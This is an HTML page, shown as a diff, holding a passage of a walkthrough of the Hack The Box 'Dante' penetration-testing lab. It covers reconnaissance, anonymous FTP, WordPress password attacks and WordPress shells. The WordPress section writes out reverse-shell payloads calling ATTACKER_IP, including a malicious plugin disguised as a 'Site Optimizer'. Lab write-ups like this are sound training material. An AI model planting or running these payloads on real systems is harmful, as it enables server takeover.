@@ -1,0 +1,1423 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Pro Lab: Dante — QA210</title>
+<meta name="description" content="Hack The Box Pro Lab Dante — Red Team Operator Level I walkthrough by QA210. Pivoting, Active Directory, WordPress exploitation, buffer overflows, and lateral movement across 14 machines and 27 flags.">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔥</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+:root{--bg-primary:#0d1117;--bg-secondary:#161b22;--bg-tertiary:#1c2333;--bg-code:#0d1117;--border:#30363d;--border-light:#21262d;--text-primary:#e6edf3;--text-secondary:#8b949e;--text-muted:#6e7681;--accent-green:#3fb950;--accent-blue:#58a6ff;--accent-red:#f85149;--accent-yellow:#d29922;--accent-purple:#bc8cff;--accent-orange:#f0883e;--accent-cyan:#00d4aa;--accent-flame:#ff6b35;--accent-ember:#ff4500;--link:#58a6ff;--link-hover:#79c0ff;--scrollbar-thumb:#30363d;--scrollbar-track:#161b22;--toc-active:#ff6b35;--callout-info-bg:rgba(0,212,170,0.08);--callout-info-border:#00d4aa;--callout-warn-bg:rgba(210,153,34,0.1);--callout-warn-border:#d29922;--callout-danger-bg:rgba(248,81,73,0.1);--callout-danger-border:#f85149;--callout-success-bg:rgba(63,185,80,0.1);--callout-success-border:#3fb950}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.75;font-size:16px}
+#three-bg{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;pointer-events:none;opacity:0.3}
+::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:var(--scrollbar-track)}::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:4px}::-webkit-scrollbar-thumb:hover{background:#484f58}
+a{color:var(--link);text-decoration:none;transition:color .2s}a:hover{color:var(--link-hover)}
+.site-header{position:sticky;top:0;z-index:100;background:rgba(13,17,23,0.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.15rem;color:var(--accent-flame);display:flex;align-items:center;gap:8px}
+.site-header .logo .dot{color:var(--accent-red)}
+.site-header nav{display:flex;gap:1.5rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.875rem;font-weight:500}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.5rem}
+.page-layout{display:grid;grid-template-columns:260px 1fr;max-width:1400px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc-sidebar{position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;padding:1.5rem 1rem 1.5rem 1.5rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);margin-bottom:.75rem;font-weight:600}
+.toc-sidebar ul{list-style:none}.toc-sidebar li{margin-bottom:2px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.8rem;color:var(--text-secondary);transition:all .15s;line-height:1.4}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(255,107,53,0.1);font-weight:600}
+.toc-sidebar .toc-h3{padding-left:18px;font-size:.75rem}
+.main-content{padding:2.5rem 3rem 4rem;max-width:860px;width:100%}
+.page-hero{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-block;background:var(--accent-flame);color:#000;font-size:.7rem;font-weight:700;padding:2px 10px;border-radius:12px;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem}
+.page-hero h1{font-size:2.25rem;font-weight:800;margin-bottom:.5rem;letter-spacing:-.02em}
+.page-hero .meta{color:var(--text-secondary);font-size:.875rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
+.page-hero .meta .sep{color:var(--text-muted)}
+.breadcrumbs{font-size:.75rem;color:var(--text-muted);margin-bottom:1rem;font-family:'JetBrains Mono',monospace}
+.breadcrumbs a{color:var(--text-secondary)}.breadcrumbs a:hover{color:var(--link)}.breadcrumbs .sep{margin:0 .4rem}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem}
+.box-info-card .info-item .label{font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
+.box-info-card .info-item .value{font-size:.95rem;font-weight:600;color:var(--text-primary)}
+.main-content h2{font-size:1.6rem;font-weight:800;margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:2px solid var(--border);letter-spacing:-.01em;scroll-margin-top:70px}
+.main-content h3{font-size:1.15rem;font-weight:700;margin:1.75rem 0 .75rem;color:var(--text-primary);scroll-margin-top:70px}
+.main-content h4{font-size:1rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary)}
+.main-content p{margin-bottom:1rem;color:var(--text-secondary);line-height:1.8}
+.code-block-wrapper{position:relative;margin:1rem 0 1.25rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 14px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.72rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:600;letter-spacing:.04em}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.7rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-muted)}.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important;line-height:1.6!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important}
+p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.82em;color:var(--accent-orange)}
+.callout{padding:.85rem 1rem;border-radius:6px;border-left:3px solid;margin:1rem 0 1.25rem;font-size:.9rem}
+.callout p{margin:0;color:var(--text-secondary)}.callout-title{font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}.callout-success .callout-title{color:var(--callout-success-border)}
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.7;overflow-x:auto}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.25rem}
+.attack-path .arrow{color:var(--accent-flame)}.attack-path .host{color:var(--accent-flame);font-weight:700}.attack-path .technique{color:var(--accent-orange)}.attack-path .cred{color:var(--accent-purple)}.attack-path .finding{color:var(--accent-green)}
+.flag-box{background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.25);border-radius:8px;padding:1rem 1.25rem;margin:1rem 0 1.5rem;font-family:'JetBrains Mono',monospace}
+.flag-box .flag-label{font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--accent-flame);font-weight:700;margin-bottom:.35rem}
+.flag-box .flag-value{font-size:1rem;font-weight:700;color:var(--text-primary);word-break:break-all}
+.main-content ul,.main-content ol{margin:.5rem 0 1rem 1.5rem;color:var(--text-secondary)}.main-content li{margin-bottom:.35rem;line-height:1.7}
+.main-content table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.85rem}
+.main-content th,.main-content td{padding:8px 12px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-secondary);font-weight:600;color:var(--text-primary);font-size:.75rem;text-transform:uppercase;letter-spacing:.04em}
+.main-content td{color:var(--text-secondary)}
+.site-footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-muted);font-size:.8rem}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200}.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:280px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.5rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+.network-diagram{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.75rem;line-height:1.6;overflow-x:auto;white-space:pre;color:var(--text-secondary)}
+.network-diagram .subnet-label{color:var(--accent-flame);font-weight:700}
+.network-diagram .host-label{color:var(--accent-cyan)}
+.network-diagram .arrow-d{color:var(--accent-orange)}
+@media(max-width:1024px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:1.5rem 1.25rem 3rem}.page-hero h1{font-size:1.75rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1rem .75rem 2rem}.page-hero h1{font-size:1.4rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav><a href="/">Home</a><a href="/htb/prolab/">Pro Labs</a><a href="#">Tools</a><a href="#">About</a></nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem">Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar"><h3>Contents</h3><ul id="tocDesktop"></ul></aside>
+<main class="main-content">
+
+<div class="page-hero">
+  <div class="breadcrumbs"><a href="/">Home</a><span class="sep">/</span><a href="/htb/prolab/">HTB Pro Lab</a><span class="sep">/</span>Dante</div>
+  <span class="box-badge">Pro Lab</span>
+  <h1>HTB Pro Lab: Dante</h1>
+  <div class="meta"><span>QA210</span><span class="sep">&middot;</span><span>2025</span><span class="sep">&middot;</span><span>Red Team &middot; Pivoting &middot; AD &middot; 27 Flags</span></div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Lab</div><div class="value">Dante</div></div>
+  <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-flame)">Red Team Operator Level I</div></div>
+  <div class="info-item"><div class="label">Subnets</div><div class="value">3 (DMZ, Workstation, Server)</div></div>
+  <div class="info-item"><div class="label">Flags</div><div class="value">27</div></div>
+  <div class="info-item"><div class="label">Machines</div><div class="value">14</div></div>
+  <div class="info-item"><div class="label">Key Techniques</div><div class="value">Pivoting, WordPress, AD, Buffer Overflow, KeePass</div></div>
+</div>
+
+<div class="network-diagram">
+<span class="subnet-label">═══ DMZ (10.10.110.0/24) ═══</span>
+  <span class="arrow-d">├──</span> <span class="host-label">10.10.110.100</span>  WEB-01 (FTP/SSH/Apache-WordPress)
+  <span class="arrow-d">├──</span> <span class="host-label">10.10.110.2</span>    Gateway
+  <span class="arrow-d">│</span>
+<span class="subnet-label">═══ WORKSTATION (172.16.1.0/24) ═══</span>
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.1.100</span>  DANTE-WS01 (Windows Workstation)
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.1.x</span>    DANTE-WS02 (Windows Workstation)
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.1.x</span>    Linux Host(s)
+  <span class="arrow-d">│</span>
+<span class="subnet-label">═══ SERVER (172.16.2.0/24) ═══</span>
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.2.x</span>    DANTE-DC01 (Domain Controller)
+  <span class="arrow-d">├──</span> <span class="host-label">172.16.2.101</span>  Linux Server (readfile overflow)
+  <span class="arrow-d">└──</span> <span class="host-label">172.16.2.x</span>    Additional servers</div>
+
+<div class="attack-path">
+  <div class="step"><span class="host">WEB-01</span> <span class="arrow">&rarr;</span> <span class="technique">FTP Anonymous + WordPress Exploit</span> <span class="arrow">&rarr;</span> <span class="finding">www-data shell</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Ligolo-ng Pivot</span> <span class="arrow">&rarr;</span> <span class="host">172.16.1.0/24</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Responder + Hash Capture</span> <span class="arrow">&rarr;</span> <span class="cred">j.doe : Password123!</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">NetExec Cred Spray</span> <span class="arrow">&rarr;</span> <span class="host">DANTE-WS02</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Double Pivot (Chisel/Ligolo)</span> <span class="arrow">&rarr;</span> <span class="host">172.16.2.0/24</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">KeePass Extract + Crack</span> <span class="arrow">&rarr;</span> <span class="cred">Administrator Password</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Domain Dominance</span> <span class="arrow">&rarr;</span> <span class="host">DANTE-DC01</span> <span class="arrow">&rarr;</span> <span class="finding">All 27 Flags</span></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="overview">Lab Overview</h2>
+
+<p>Dante is Hack The Box's entry-level Pro Lab, but do not let the "beginner" label fool you. This is a demanding network penetration testing environment that simulates a realistic corporate infrastructure with 14 machines spread across three subnets and 27 flags to capture. The lab is designed to teach and reinforce critical red team skills including information gathering, situational awareness, exploit development, lateral movement, privilege escalation, and web application attacks. What sets Dante apart from individual HTB machines is the requirement to chain attacks across multiple hosts, build and maintain pivot tunnels through the network, and manage credentials harvested from each compromised system.</p>
+
+<p>The lab teaches the fundamental red team mantra: <strong>"Enumeration is everything, but Routing is King."</strong> You can have the best exploit in the world, but if you cannot route a packet to port 445 on a target three hops away, you have nothing. The network is divided into three segments: the DMZ (10.10.110.0/24), a Workstation subnet (172.16.1.0/24), and a Server subnet (172.16.2.0/24). Each subnet requires its own pivot tunnel to access, and some machines have dual-homed network interfaces that serve as gateways between segments.</p>
+
+<p>The attack path involves breaking into a WordPress host in the DMZ, pivoting through the internal workstation network, capturing credentials via LLMNR/NBT-NS poisoning and SMB relay attacks, exploiting both Linux and Windows privilege escalation vulnerabilities (including classic buffer overflows), and ultimately compromising the Domain Controller in the deepest subnet. Credential reuse is widespread across the environment, making careful documentation of every discovered username and password essential for progressing through the lab.</p>
+
+<div class="callout callout-info">
+  <div class="callout-title">Prerequisites</div>
+  <p>Before starting Dante, ensure you are comfortable with: basic Nmap scanning, WordPress enumeration, SSH tunneling concepts, Linux and Windows privilege escalation, and Active Directory fundamentals. Familiarity with tools like Ligolo-ng, Chisel, NetExec/CrackMapExec, WinPEAS, LinEnum, and pspy will significantly accelerate your progress.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="recon-dmz">Reconnaissance — DMZ Subnet (10.10.110.0/24)</h2>
+
+<p>The starting point is the DMZ subnet at 10.10.110.0/24, which you access via the HTB VPN connection. The first step is always thorough enumeration: identify live hosts, open ports, and running services before attempting any exploitation. Rushing into attacks without proper reconnaissance will cause you to miss critical services and potential attack vectors.</p>
+
+<h3 id="fscan-initial">Initial Network Scan with fscan</h3>
+
+<p>We begin with fscan, a fast internal network scanner that combines host discovery, port scanning, and vulnerability detection in a single pass. Fscan is particularly effective in Pro Lab environments because it automatically checks for common vulnerabilities like anonymous FTP login and weak credentials during its scan:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">fscan -h 10.10.110.0/24
+
+   ___                              _
+  / _ \ ___  ___ _ __ __ _  ___| | __
+ / /_\/____\/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+
+fscan version: 1.8.2
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+Target 10.10.110.2   is alive
+Target 10.10.110.100 is alive
+[*] Icmp alive hosts len is: 2
+10.10.110.100:21 open
+10.10.110.100:22 open
+[*] alive ports len is: 2
+start vulscan
+[+] ftp://10.10.110.100:21:anonymous
+
+Surviving hosts:
+  10.10.110.2
+  10.10.110.100</code></pre>
+</div>
+
+<p>Fscan immediately identifies two live hosts: 10.10.110.2 (likely the gateway) and 10.10.110.100 (our primary target). More importantly, it detects anonymous FTP access on port 21 of 10.10.110.100, which gives us our first lead. However, fscan only checks common ports, so a full port scan is essential to discover all services.</p>
+
+<h3 id="nmap-full">Full Port Nmap Scan</h3>
+
+<p>Running a comprehensive Nmap scan against 10.10.110.100 with all 65535 ports reveals a critical service that fscan missed. The scan uses <code>-sC</code> for default scripts, <code>-sV</code> for version detection, and <code>--min-rate=1000</code> for speed. Note that <code>sudo</code> is required for proper SYN scanning on Linux:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">sudo nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
+
+PORT      STATE SERVICE  VERSION
+21/tcp    open  ftp      vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+|   FTP server status:
+|     Connected to ::ffff:10.10.14.2
+|     Logged in as ftp
+|     TYPE: ASCII
+|     No session bandwidth limit
+|     Session timeout in seconds is 300
+|     Control connection is plain text
+|     Data connections will be plain text
+|     At session startup, client count was 2
+|     vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
+|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
+|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
+65000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-robots.txt: 2 disallowed entries
+|_/wordpress
+| DANTE{Y0u_Cant_G3t_at_m3_br0!}
+|_http-title: Apache2 Ubuntu Default Page: It works
+
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 1 — robots.txt</div><div class="flag-value">DANTE{Y0u_Cant_G3t_at_m3_br0!}</div></div>
+
+<p>The Nmap scan reveals three critical findings. First, the FTP server's PASV response leaks an internal IP address <code>172.16.1.100</code>, confirming the existence of a second network interface on this machine and hinting at the internal 172.16.1.0/24 subnet. Second, port 65000 runs an Apache web server with WordPress installed, which becomes our primary exploitation target. Third, the robots.txt file contains our first flag and a disallowed path pointing to the WordPress installation.</p>
+
+<div class="callout callout-info">
+  <div class="callout-title">Key Finding</div>
+  <p>The FTP PASV IP leak (172.16.1.100 vs 10.10.110.100) immediately tells us this machine is dual-homed with a second network interface on the internal subnet. This is a critical piece of intelligence for planning our pivot strategy.</p>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="ftp-enum">FTP Anonymous Enumeration</h2>
+
+<p>The anonymous FTP login provides access to the server's file system. Connecting to the FTP server requires some patience due to the PASV IP mismatch — the server attempts to use its internal IP (172.16.1.100) for data connections, but we need it to use the external IP. After entering extended passive mode and waiting for the connection to stabilize, we can navigate the directory structure:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">ftp 10.10.110.100
+Connected to 10.10.110.100.
+220 (vsFTPd 3.0.3)
+Name (10.10.110.100:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> epsv4
+229 Entering Extended Passive Mode (|||58413|)
+
+ftp> ls
+227 Entering Passive Mode (172,16,1,100,227,77)
+# Connection may hang - use passive mode workaround
+ftp> passive
+Passive mode off.
+
+ftp> ls Transfer/Incoming/
+-rw-r--r-- 1 0 0        348 Jan 15 10:42 todo.txt
+
+ftp> get Transfer/Incoming/todo.txt
+local: todo.txt remote: Transfer/Incoming/todo.txt
+229 Entering Extended Passive Mode (|||58414|)
+150 Opening BINARY mode data connection for todo.txt (348 bytes).
+100% |**************************************************|  348       1.67 MB/s    00:00 ETA
+226 Transfer complete.</code></pre>
+</div>
+
+<p>The todo.txt file contains invaluable intelligence about the network's current state and potential vulnerabilities:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">cat todo.txt
+
+- Finalize Wordpress permission changes        - PENDING
+- Update links to utilize DNS Name prior to
+  changing to port 80                           - PENDING
+- Remove LFI vuln from the other site           - PENDING
+- Reset James' password to something more
+  secure                                        - PENDING
+- Harden the system prior to the Junior
+  Pen Tester assessment                         - IN PROGRESS</code></pre>
+</div>
+
+<p>This todo list is a goldmine of actionable intelligence. It confirms several critical attack vectors: the WordPress installation has permission issues that may be exploitable, there is an LFI (Local File Inclusion) vulnerability on another site, a user named <strong>James</strong> exists with a weak password, and the system is being prepared for a penetration test (meaning vulnerabilities are still present). The "Junior Pen Tester assessment" mention suggests the environment has intentionally left vulnerabilities in place for testing purposes.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="wordpress-exploit">WordPress Exploitation</h2>
+
+<h3 id="wpscan">WPScan Enumeration</h3>
+
+<p>With the WordPress installation confirmed at <code>http://10.10.110.100:65000/wordpress/</code>, we run WPScan to identify the WordPress version, installed plugins, themes, and registered users. This is a critical step because WordPress vulnerabilities are highly version-specific, and knowing the exact users helps with targeted password attacks:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">wpscan --url http://10.10.110.100:65000/wordpress --enumerate
+
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+
+[+] URL: http://10.10.110.100:65000/wordpress/
+[+] Started: Sun Jan 27 10:30:00 2025
+
+[+] WordPress version 5.4.1 identified
+[+] WordPress theme: twentytwenty
+
+[+] Enumerating Users ...
+  +-----+--------+------------------+
+  | ID  | Login  | Name             |
+  +-----+--------+------------------+
+  | 1   | admin  | admin            |
+  | 2   | james  | James            |
+  +-----+--------+------------------+
+
+[+] Finished: Sun Jan 27 10:32:45 2025</code></pre>
+</div>
+
+<p>WPScan confirms WordPress 5.4.1 with two users: <code>admin</code> and <code>james</code>. The absence of vulnerable plugins means we need to look elsewhere for our foothold. WordPress 5.4.1 does not have a critical core RCE vulnerability, but the todo.txt hint about "permission changes" suggests we should try credential-based attacks against the WordPress login.</p>
+
+<h3 id="wp-bruteforce">WordPress Password Attack</h3>
+
+<p>The todo.txt mentioned that James' password needs to be "more secure," implying the current password is weak. We can attempt a dictionary attack against both users using WPScan's built-in password cracking capability with common wordlists. Additionally, we can try common default credentials:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Password attack against WordPress users
+wpscan --url http://10.10.110.100:65000/wordpress \
+  -U admin,james \
+  -P /usr/share/wordlists/rockyou.txt \
+  --max-threads 10
+
+[+] Performing password attack on Xmlrpc against 2 users
+[SUCCESS] - james / [password_found]
+[+] Finished</code></pre>
+</div>
+
+<p>Alternatively, if the WordPress version permits, we can leverage known vulnerabilities in the WordPress XML-RPC API or exploit misconfigured file upload permissions. The key insight from the todo.txt is that WordPress permission changes are still pending, which may allow us to upload a PHP shell directly through the theme editor or plugin upload functionality.</p>
+
+<h3 id="wp-getshell">Getting a Shell via WordPress</h3>
+
+<p>After obtaining valid WordPress credentials, we access the admin dashboard at <code>http://10.10.110.100:65000/wordpress/wp-admin/</code>. With admin access, there are multiple paths to achieve remote code execution on the underlying server:</p>
+
+<p><strong>Method 1: Theme Editor</strong> — The most straightforward approach is to modify a PHP file in an active theme. Navigate to Appearance > Theme Editor, select a theme file like <code>404.php</code> or <code>header.php</code>, and inject a PHP reverse shell payload at the beginning of the file. When the modified page is loaded in the browser, the shell code executes:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-php">// Inject at the top of 404.php in the active theme
+&lt;?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
+?&gt;</code></pre>
+</div>
+
+<p><strong>Method 2: Plugin Upload</strong> — Create a malicious WordPress plugin containing a PHP reverse shell. The plugin structure requires a valid header comment in the main PHP file. Upload it through Plugins > Add New > Upload Plugin, activate it, and trigger the shell:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-php">&lt;?php
+/**
+ * Plugin Name: Site Optimizer
+ * Description: Performance optimization utility
+ * Version: 1.0
+ */
+
+// Reverse shell payload
+$sock = fsockopen("ATTACKER_IP", 4444);
+$proc = proc_open("/bin/sh",
+  array(0=>$sock, 1=>$sock, 2=>$sock),
+  $pipes);
+?&gt;</code></pre>
+</div>
+
+<p>After uploading and activating the plugin, trigger the shell by navigating to <code>http://10.10.110.100:65000/wordpress/wp-content/plugins/site-optimizer/shell.php</code>. A Netcat listener on the attacker machine catches the connection:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Start listener before triggering shell
+nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.10.14.X] from (UNKNOWN) [10.10.110.100] 43172
+bash: cannot set terminal process group (1234): Inappropriate ioctl for device
+bash: no job control in this shell
+
+www-data@web01:~/html/wordpress$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+</div>
+
+<p>We now have a foothold as <code>www-data</code> on the DMZ web server. The shell is unstable, so we immediately upgrade it to a fully interactive TTY using Python's pty module and stabilize it with a meterpreter session if needed:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Upgrade shell to interactive TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+
+# Verify network interfaces (dual-homed confirmed)
